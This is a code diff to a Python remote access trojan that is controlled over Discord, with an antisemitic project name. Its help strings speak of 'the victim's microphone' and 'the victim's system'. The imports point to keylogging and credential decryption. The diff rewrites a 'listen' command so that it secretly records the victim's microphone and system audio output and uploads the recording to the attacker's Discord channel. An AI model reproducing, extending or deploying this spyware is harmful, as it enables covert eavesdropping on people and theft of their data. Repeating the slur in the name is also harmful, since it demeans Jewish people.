@@ -5,7 +5,9 @@ from discord.ext import commands
 from PIL import Image, ImageDraw
 from comtypes import CLSCTX_ALL
 from pynput import keyboard
+import soundcard as sc
 import win32com.client
+import numpy as np
 import subprocess
 import webbrowser
 import win32crypt
@@ -21,7 +23,6 @@ import asyncio
 import discord
 import getpass
 import hashlib
-import pyaudio
 import sqlite3
 import tarfile
 import base64
@@ -41,7 +42,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3.9" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.4.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -1669,41 +1670,138 @@ async def stoptts(ctx):
     else:
         await ctx.send("No TTS process running.")
 
-@bot.command(help="Records audio from the victim's microphone for 10 seconds.")
-async def listen(ctx):
+record_guard = Event()
+
+@bot.command(help="Records default audio device and default communications mic. format $listen {capture mode in|out|both (default both)} {duration in seconds default 10.0}")
+async def listen(ctx, mode: str = "both", duration: float = 10):
+    if record_guard.is_set():
+        await ctx.send("A recording is already in progress.")
+        return
+    record_guard.set()
+
     loop = asyncio.get_event_loop()
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 2
-    RATE = 44100
-    RECORD_SECONDS = 10
+    MODE = mode.lower().strip()
+    SECONDS = duration
+    SR = 44100
+    CH = 2
+    SILENCE_RMS_THRESH = 1e-4
 
-    def recording_thread():
-        p = pyaudio.PyAudio()
-        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
-        frames = []
-        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
-            data = stream.read(CHUNK)
-            frames.append(data)
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
+    def print_error(*a):
+        try: print(*a)
+        except: pass
 
-        buffer = io.BytesIO()
-        wf = wave.open(buffer, 'wb')
-        wf.setnchannels(CHANNELS)
-        wf.setsampwidth(p.get_sample_size(FORMAT))
-        wf.setframerate(RATE)
-        wf.writeframes(b''.join(frames))
-        wf.close()
-        buffer.seek(0)
-        loop.call_soon_threadsafe(asyncio.create_task, send_response(ctx, buffer))
+    def to_stereo_float(x: np.ndarray) -> np.ndarray:
+        a = x
+        if a.ndim == 1: a = np.stack([a, a], axis=1)
+        if a.shape[1] == 1: a = np.repeat(a, 2, axis=1)
+        return a.astype(np.float32, copy=False)
 
-    async def send_response(ctx, buf):
-        await ctx.send("Command Executed!", file=discord.File(fp=buf, filename="output.wav"))
+    def to_int16_stereo(x: np.ndarray) -> np.ndarray:
+        a = to_stereo_float(x)
+        a = np.clip(a, -1.0, 1.0)
+        return (a * 32767.0).astype(np.int16)
 
-    thread = Thread(target=recording_thread)
-    thread.start()
+    def record_once(mic_obj, seconds: float, sr: int, ch: int):
+        try:
+            with mic_obj.recorder(samplerate=int(sr), channels=int(ch)) as r:
+                return r.record(int(sr * seconds))
+        except Exception as e:
+            print_error("record_error:", repr(e))
+            return None
+
+    def stats(arr):
+        if arr is None or arr.size == 0: return 0.0
+        return float(np.sqrt(np.mean(np.square(arr.astype(np.float32)))))
+
+    def probe_active_loopbacks(seconds_probe=0.25):
+        try:
+            speakers = {s.name for s in sc.all_speakers()}
+            loopbacks = sc.all_microphones(include_loopback=True)
+        except Exception as e:
+            print_error("probe_enum_err:", repr(e))
+            return []
+        candidates = [m for m in loopbacks if m.name in speakers]
+        active = []
+        for m in candidates:
+            frames = record_once(m, seconds_probe, SR, CH)
+            rms = stats(frames)
+            if frames is not None and rms > SILENCE_RMS_THRESH:
+                active.append((getattr(m, "name", ""), m, rms))
+        active.sort(key=lambda x: x[2], reverse=True)
+        return active
+
+    def pick_loopback_sources():
+        active = probe_active_loopbacks(0.25)
+        if active:
+            return [m for _, m, _ in active]
+        try:
+            spk = sc.default_speaker()
+            lb = sc.get_microphone(id=spk.name, include_loopback=True)
+            return [lb]
+        except Exception as e:
+            print_error("fallback_loopback_error:", repr(e))
+            return []
+
+    def mix_float(arrs):
+        arrs = [to_stereo_float(a) for a in arrs if a is not None]
+        if not arrs: return None
+        n = min(len(a) for a in arrs)
+        if n <= 0: return None
+        stack = np.stack([a[:n] for a in arrs], axis=0).astype(np.float32)
+        mix = np.mean(stack, axis=0)
+        return np.clip(mix, -1.0, 1.0)
+
+    async def send_response(buf):
+        await ctx.send(f"Command Executed! (mode={MODE})", file=discord.File(fp=buf, filename="output.wav"))
+
+    def record(mode_sel: str):
+        pythoncom.CoInitialize()
+        try:
+            want_out = mode_sel in ("both", "out")
+            want_in  = mode_sel in ("both", "in")
+
+            out_mix = None
+            mic_frames = None
+
+            if want_out:
+                lbs = pick_loopback_sources()
+                tracks = []
+                for m in lbs:
+                    frames = record_once(m, SECONDS, SR, CH)
+                    tracks.append(frames)
+                out_mix = mix_float(tracks)
+
+            if want_in:
+                try:
+                    mic = sc.default_microphone()
+                    mic_frames = record_once(mic, SECONDS, SR, CH)
+                except Exception as e:
+                    print_error("default_mic_error:", repr(e))
+                    mic_frames = None
+
+            if out_mix is not None and mic_frames is not None:
+                n = min(len(out_mix), len(mic_frames))
+                final = 0.5*out_mix[:n].astype(np.float32) + 0.5*to_stereo_float(mic_frames[:n])
+                final = np.clip(final, -1.0, 1.0)
+            elif out_mix is not None:
+                final = out_mix
+            elif mic_frames is not None:
+                final = to_stereo_float(mic_frames)
+            else:
+                final = np.zeros((int(SR*SECONDS), 2), dtype=np.float32)
+
+            pcm16 = to_int16_stereo(final)
+            buf = io.BytesIO()
+            w = wave.open(buf, "wb")
+            w.setnchannels(2); w.setsampwidth(2); w.setframerate(SR)
+            w.writeframes(pcm16.tobytes()); w.close()
+            buf.seek(0)
+            loop.call_soon_threadsafe(asyncio.create_task, send_response(buf))
+        finally:
+            pythoncom.CoUninitialize()
+            record_guard.clear()
+
+    Thread(target=record, args=(MODE,), daemon=True).start()
 
 @bot.command(help="Types the given text on the victim's system.")
 async def write(ctx, *, text: str):
